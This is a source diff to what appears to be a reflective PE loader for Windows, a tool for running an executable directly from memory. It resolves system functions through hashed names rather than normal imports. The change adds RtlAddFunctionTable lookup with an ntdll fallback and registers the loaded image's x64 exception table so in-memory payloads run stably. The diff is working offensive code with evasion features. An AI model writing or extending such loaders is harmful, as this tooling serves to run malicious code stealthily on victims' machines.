@@ -31,6 +31,11 @@ typedef void    (WINAPI *fnRtlZeroMemory_t)(PVOID, SIZE_T);
 typedef BOOL    (WINAPI *fnFlushInstructionCache_t)(HANDLE, LPCVOID, SIZE_T);
 typedef HANDLE  (WINAPI *fnGetCurrentProcess_t)(void);
 
+/* x64 exception handling — CRITICAL for reflective PE loading */
+#if defined(_M_X64) || defined(__x86_64__)
+typedef BOOLEAN (WINAPI *fnRtlAddFunctionTable_t)(PRUNTIME_FUNCTION, DWORD, DWORD64);
+#endif
+
 typedef struct {
     fnLoadLibraryA_t         pLoadLibraryA;
     fnGetProcAddress_t       pGetProcAddress;
@@ -39,6 +44,9 @@ typedef struct {
     fnVirtualFree_t          pVirtualFree;
     fnFlushInstructionCache_t pFlushInstructionCache;
     fnGetCurrentProcess_t    pGetCurrentProcess;
+#if defined(_M_X64) || defined(__x86_64__)
+    fnRtlAddFunctionTable_t  pRtlAddFunctionTable;
+#endif
 } RESOLVED_APIS;
 
 /* DJB2 hash — case-insensitive for module names (wide char) */
@@ -125,6 +133,8 @@ static BYTE *_find_module(DWORD modHash) {
 #define H_VirtualFree           0x668FCF2E
 #define H_FlushInstructionCache 0xB7DCEDDD
 #define H_GetCurrentProcess     0xCA8D7527
+#define H_NTDLL                 0x22D3B5ED
+#define H_RtlAddFunctionTable   0xBDB9F1AE
 
 static BOOL _resolve_apis(RESOLVED_APIS *api) {
     BYTE *k32 = _find_module(H_KERNEL32);
@@ -137,6 +147,19 @@ static BOOL _resolve_apis(RESOLVED_APIS *api) {
     api->pVirtualFree        = (fnVirtualFree_t)        _resolve_export(k32, H_VirtualFree);
     api->pFlushInstructionCache = (fnFlushInstructionCache_t)_resolve_export(k32, H_FlushInstructionCache);
     api->pGetCurrentProcess  = (fnGetCurrentProcess_t)  _resolve_export(k32, H_GetCurrentProcess);
+
+#if defined(_M_X64) || defined(__x86_64__)
+    /* RtlAddFunctionTable is in kernel32 (forwards to ntdll).
+     * Without it, ANY exception in the loaded PE crashes the process
+     * because the OS can't find the unwind info for the code range. */
+    api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)_resolve_export(k32, H_RtlAddFunctionTable);
+    if (!api->pRtlAddFunctionTable) {
+        /* Fallback: try ntdll directly */
+        BYTE *ntdll = _find_module(H_NTDLL);
+        if (ntdll)
+            api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)_resolve_export(ntdll, H_RtlAddFunctionTable);
+    }
+#endif
 
     return (api->pLoadLibraryA && api->pGetProcAddress &&
             api->pVirtualAlloc && api->pVirtualProtect);
@@ -343,6 +366,21 @@ static BOOL load_pe_and_run(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
     /* Flush instruction cache */
     if (api->pFlushInstructionCache && api->pGetCurrentProcess)
         api->pFlushInstructionCache(api->pGetCurrentProcess(), NULL, 0);
+
+    /* Register exception handlers (x64 ONLY — CRITICAL)
+     * Without this, any structured exception in the loaded PE causes
+     * STATUS_BAD_FUNCTION_TABLE and the process is killed instantly.
+     * This includes CRT init, __try/__except, and even stack unwinding. */
+#if defined(_M_X64) || defined(__x86_64__)
+    {
+        IMAGE_DATA_DIRECTORY *excDir = &mappedNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
+        if (excDir->VirtualAddress && excDir->Size && api->pRtlAddFunctionTable) {
+            PRUNTIME_FUNCTION pFuncTable = (PRUNTIME_FUNCTION)(base + excDir->VirtualAddress);
+            DWORD numEntries = excDir->Size / sizeof(RUNTIME_FUNCTION);
+            api->pRtlAddFunctionTable(pFuncTable, numEntries, (DWORD64)base);
+        }
+    }
+#endif
 
     /* Set section protections */
     _protect_sections(base, mappedNt, api);
